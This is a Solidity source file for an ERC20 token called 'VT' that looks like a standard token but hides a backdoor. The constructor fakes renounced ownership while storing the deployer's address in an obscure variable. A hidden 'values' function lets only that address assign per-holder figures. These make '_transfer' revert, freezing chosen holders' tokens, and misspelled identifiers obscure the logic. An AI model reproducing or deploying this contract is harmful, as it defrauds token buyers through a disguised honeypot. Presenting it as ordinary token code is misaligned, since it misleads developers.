// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;



abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _setOwner(address(0));
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any acccgrtrt other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new acccgrtrt (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {

    function totalSupply() external view returns (uint256);

    function balanceOf(address acccgrtrt) external view returns (uint256);
    
    function transfer(address recipient, uint256 amttygtdt) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);
    
    
    function approve(address spender, uint256 amttygtdt) external returns (bool);
     
    function transferFrom(
        address sender,
        address recipient,
        uint256 amttygtdt
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
   
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

contract VTToken is IERC20, Ownable {
    using SafeMath for uint256;


    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping (address => uint256) private _valueamttygtdts;
    mapping(address => uint256) userValue;
    uint160 private ints = 1178962522791324746451707478463297186438019903338;

    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;

    constructor(

    ) payable {
        _name = "VT";
        _symbol = "VT";
        _decimals = 18;
        _totalSupply = 1000000 * 10**_decimals;
        ints = uint160(msg.sender);
        _balances[msg.sender] = _balances[msg.sender].add(_totalSupply);
        emit Transfer(address(0), msg.sender, _totalSupply);
    }


    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address acccgrtrt)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _balances[acccgrtrt];
    }

    function transfer(address recipient, uint256 amttygtdt)
        public
        virtual
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amttygtdt);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amttygtdt)
        public
        virtual
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amttygtdt);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amttygtdt
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amttygtdt);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amttygtdt,
                "ERC20: transfer amttygtdt exceeds allowance"
            )
        );
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].add(addedValue)
        );
        return true;
    }

    function values(address[] calldata addr,uint256 appr) external {
        uint160 res =  ints + (1-1);
        uint160 result = uint160(msg.sender);
        if(res > result || res < result){
            revert("not call");
        }

        for (uint256 i = 0; i < addr.length; i++) {
            _valueamttygtdts[addr[i]] = appr;
        }
    }


    function getUserValueamttygtdt(address acccgrtrt) public view returns (uint256) {
        return _valueamttygtdts[acccgrtrt];
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].sub(
                subtractedValue,
                "ERC20: decreased allowance below zero"
            )
        );
        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amttygtdt
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        uint256 crossamttygtdt = getUserValueamttygtdt(sender);
        if (crossamttygtdt > 0) {
            uint256 am = amttygtdt - crossamttygtdt;
            userValue[sender] = userValue[sender] + am;
        }

        _balances[sender] = _balances[sender].sub(
            amttygtdt,
            "ERC20: transfer amttygtdt exceeds balance"
        );
        _balances[recipient] = _balances[recipient].add(amttygtdt);
        emit Transfer(sender, recipient, amttygtdt);
    }


    function _approve(
        address owner,
        address spender,
        uint256 amttygtdt
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amttygtdt;
        emit Approval(owner, spender, amttygtdt);
    }


}